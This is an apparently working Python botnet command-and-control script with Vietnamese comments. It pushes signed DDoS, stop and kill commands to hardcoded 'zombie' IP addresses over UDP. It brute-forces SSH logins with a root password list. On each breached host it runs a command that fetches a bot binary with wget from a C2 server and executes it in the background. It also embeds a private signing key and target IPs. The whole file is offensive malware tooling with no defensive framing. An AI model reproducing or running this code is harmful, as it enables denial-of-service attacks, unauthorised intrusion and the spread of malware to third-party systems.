#!/usr/bin/env python3
"""
Botmaster C2 Controller
Usage:
    python botmaster.py ddos   <zombie_ip> <target> <port> <duration>
    python botmaster.py stop   <zombie_ip>
    python botmaster.py kill   <zombie_ip>
    python botmaster.py brute  <target_ip> [port]
    python botmaster.py check  [ip|all]
"""

import socket
import json
import sys
import time
import base64

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

try:
    from nacl.signing import SigningKey
    HAS_NACL = True
except ImportError:
    HAS_NACL = False

PRIVATE_KEY = "92e814b2802b2a62a262764289a80f32c72f4e158d0dde66f2af3cce700eac74"
C2_IP = "209.97.166.150"
P2P_PORT = 9999

USERNAMES = ["root"]
PASSWORDS = [
    "123456", "password", "root", "admin", "toor",
    "ubuntu", "1234", "km=Mtht12345vu", "P@ssw0rd",
]

ZOMBIE_IPS = [
    "209.97.160.87",
    "167.71.209.10",
    "152.42.222.108",
]


# ============================================================
# CRYPTO
# ============================================================

def sign(cmd):
    """Ký lệnh bằng Ed25519 private key."""
    if not HAS_NACL:
        return cmd
    body = {k: v for k, v in cmd.items() if k != "signature"}
    msg = json.dumps(body, sort_keys=True).encode()
    sk = SigningKey(bytes.fromhex(PRIVATE_KEY))
    sig = sk.sign(msg).signature
    cmd["signature"] = base64.b64encode(sig).decode()
    return cmd


# ============================================================
# C2 PUSH
# ============================================================

def push(zombie_ip, cmd):
    """Gửi lệnh đã ký đến zombie qua UDP."""
    version = int(time.time())
    signed = sign(cmd)
    msg = json.dumps({"type": "C2_PUSH", "version": version, "payload": signed}).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(msg, (zombie_ip, P2P_PORT))
    sock.close()
    print(f"[✓] Sent {cmd['type']} v{version} → {zombie_ip}:{P2P_PORT}")


# ============================================================
# SSH BRUTE-FORCE + INFECT
# ============================================================

def ssh_brute_force(ip, port=22):
    """SSH dictionary attack. Trả về (user, pw, client) hoặc None."""
    if not HAS_PARAMIKO:
        print("[!] paramiko not installed: pip install paramiko")
        return None

    print(f"[*] Checking {ip}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        if s.connect_ex((ip, port)) != 0:
            s.close()
            print(f"[✗] Port {port} closed on {ip}")
            return None
        s.close()
    except:
        print(f"[✗] Cannot reach {ip}:{port}")
        return None

    print(f"[*] Port open. Brute-forcing {len(USERNAMES)}x{len(PASSWORDS)} = {len(USERNAMES)*len(PASSWORDS)} combos...")

    for user in USERNAMES:
        for pw in PASSWORDS:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                c.connect(ip, port=port, username=user, password=pw,
                          timeout=3, banner_timeout=3, auth_timeout=3)
                print(f"[✓] HIT {ip} → {user}:{pw}")
                return (user, pw, c)
            except paramiko.AuthenticationException:
                c.close()
                continue
            except paramiko.SSHException:
                c.close()
                continue
            except socket.timeout:
                c.close()
                continue
            except socket.error:
                c.close()
                print(f"[✗] Connection lost to {ip}")
                return None
            except:
                c.close()
                continue

    print(f"[✗] No valid credentials found for {ip}")
    return None


def infect(ip, user, pw, ssh_client):
    """Tải bot từ C2 và chạy trên target qua SSH."""
    try:
        cmd = (
            "cd /tmp && "
            f"wget -q http://{C2_IP}/bot -O bot 2>/dev/null && "
            "chmod +x bot && "
            "nohup ./bot >/dev/null 2>&1 &"
        )
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=60)
        stdout.channel.recv_exit_status()
        print(f"[✓] Infected {ip} ({user}:{pw})")
    except Exception as e:
        print(f"[✗] Infect failed {ip}: {e}")
    finally:
        ssh_client.close()


def brute_and_infect(ip, port=22):
    """Brute-force SSH rồi lây nhiễm."""
    result = ssh_brute_force(ip, port)
    if result:
        user, pw, client = result
        infect(ip, user, pw, client)
    else:
        print(f"[✗] Failed to compromise {ip}")


# ============================================================
# CHECK BOT
# ============================================================

def check_bot(ip):
    """PING UDP 9999 → xem bot có sống không."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(3)
        sock.sendto(json.dumps({"type": "PING"}).encode(), (ip, P2P_PORT))
        data, _ = sock.recvfrom(1024)
        if json.loads(data.decode()).get("type") == "PONG":
            print(f"  {ip}   ALIVE")
            return True
    except:
        pass
    finally:
        sock.close()
    print(f"  {ip}   DEAD")
    return False


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    action = sys.argv[1].lower()

    if action == "ddos" and len(sys.argv) == 6:
        push(sys.argv[2], {"type": "DDOS", "target": sys.argv[3], "port": sys.argv[4], "duration": sys.argv[5]})

    elif action == "stop" and len(sys.argv) >= 3:
        push(sys.argv[2], {"type": "STOP"})

    elif action == "kill" and len(sys.argv) >= 3:
        push(sys.argv[2], {"type": "KILL"})

    elif action == "brute" and len(sys.argv) >= 3:
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 22
        brute_and_infect(sys.argv[2], port)

    elif action == "check":
        target = sys.argv[2] if len(sys.argv) >= 3 else "all"
        if target == "all":
            print(f"\n  Scanning {len(ZOMBIE_IPS)} zombies...\n")
            alive = sum(1 for ip in ZOMBIE_IPS if check_bot(ip))
            print(f"\n  Result: {alive}/{len(ZOMBIE_IPS)} alive\n")
        else:
            check_bot(target)

    else:
        print(__doc__)
